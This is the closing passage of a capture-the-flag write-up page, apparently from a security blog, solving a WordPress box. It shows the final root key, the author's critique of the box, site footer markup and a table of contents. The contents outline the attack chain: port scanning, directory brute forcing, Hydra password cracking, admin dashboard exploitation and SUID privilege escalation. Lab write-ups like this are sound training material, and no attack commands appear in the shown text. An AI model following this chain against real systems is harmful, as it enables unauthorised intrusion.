+</code></pre></div><p>And just like that, we now both have root access and the last key: <code>04787ddef27c3dee1ee161b21670b4e4</code>.</p>
+<h2 id=outro>Outro</h2>
+<p>Overall, this boxed prove to be pretty balanced difficulty-wise. I mostly have one critique - the over-reliance on the massive dictionary file. The box doesn&rsquo;t handle many connections well, so the password cracking took a considerable amount of time. If I had to enumerate usernames with this wordlist as well, it would have taken even longer.</p>
+<p>I would have also liked the front-facing side of the website to lead somewhere, rather than just working as a front/cover. I think using the <code>robots.txt</code> file as a callback to the show was somewhat clever.</p>
+<p>It was nice to try out a couple of Rust written tools this time.</p>
+</section>
+<footer class=article-footer>
+<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span>
+</section>
+</footer>
+</article>
+<aside class=related-contents--wrapper>
+<h2 class=section-title>Related contents</h2>
+<div class=related-contents>
+<div class="flex article-list--tile">
+<article class=has-image>
+<a href=/p/hackthebox-horizontall/>
+<div class=article-image>
+<img src=/p/hackthebox-horizontall/cover.c2c3af3d966db6ce8372b824b5b0116f_hu288a9f216fac044683ba08b675347c45_114732_250x150_fill_box_smart1_3.png width=250 height=150 loading=lazy alt="Featured image of post HackTheBox: Horizontall" data-hash="md5-wsOvPZZtts6DcrgktbARbw==">
+</div>
+<div class=article-details>
+<h2 class=article-title>HackTheBox: Horizontall</h2>
+</div>
+</a>
+</article>
+</div>
+</div>
+</aside>
+<footer class=site-footer>
+<section class=copyright>
+&copy;
+2022 WeaponizedPeach >> Infosec
+</section>
+<section class=powerby>
+Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
+Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.7.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
+</section>
+</footer>
+<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
+<div class=pswp__bg></div>
+<div class=pswp__scroll-wrap>
+<div class=pswp__container>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+<div class=pswp__item></div>
+</div>
+<div class="pswp__ui pswp__ui--hidden">
+<div class=pswp__top-bar>
+<div class=pswp__counter></div>
+<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+<div class=pswp__preloader>
+<div class=pswp__preloader__icn>
+<div class=pswp__preloader__cut>
+<div class=pswp__preloader__donut></div>
+</div>
+</div>
+</div>
+</div>
+<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+<div class=pswp__share-tooltip></div>
+</div>
+<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+</button>
+<div class=pswp__caption>
+<div class=pswp__caption__center></div>
+</div>
+</div>
+</div>
+</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
+</main>
+<aside class="sidebar right-sidebar sticky">
+<section class="widget archives">
+<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
+</div>
+<h2 class="widget-title section-title">Table of contents</h2>
+<div class=widget--toc>
+<nav id=TableOfContents>
+<ol>
+<li><a href=#intro>Intro</a></li>
+<li><a href=#reconnaissance>Reconnaissance</a></li>
+<li><a href=#scanning--discovery>Scanning & Discovery</a>
+<ol>
+<li><a href=#rustscan>RustScan</a></li>
+<li><a href=#whatweb>whatweb</a></li>
+<li><a href=#browser>Browser</a></li>
+<li><a href=#feroxbuster>feroxbuster</a></li>
+<li><a href=#browser-wp-loginphp-12>Browser: /wp-login.php (1/2)</a></li>
+<li><a href=#wpscan>WPScan</a></li>
+<li><a href=#browser-wp-loginphp-22>Browser: /wp-login.php (2/2)</a></li>
+<li><a href=#hydra>Hydra</a></li>
+</ol>
+</li>
+<li><a href=#exploitation>Exploitation</a>
+<ol>
+<li><a href=#browser-wp-loginphp-admin-dashboard>Browser: /wp-login.php (Admin dashboard)</a></li>
+</ol>
+</li>
+<li><a href=#privilege-escalation>Privilege Escalation</a>
+<ol>
+<li><a href=#horizontal-escalation-robot>Horizontal Escalation (robot)</a></li>
+<li><a href=#vertical-escalation-root>Vertical escalation (root)</a>
+<ol>
+<li><a href=#suid-binaries>SUID Binaries</a></li>
+</ol>
+</li>
+</ol>
+</li>
+<li><a href=#outro>Outro</a></li>
+</ol>
+</nav>
+</div>
+</section>
+</aside>
+</div>
+<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
+<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
+</body>
+</html>
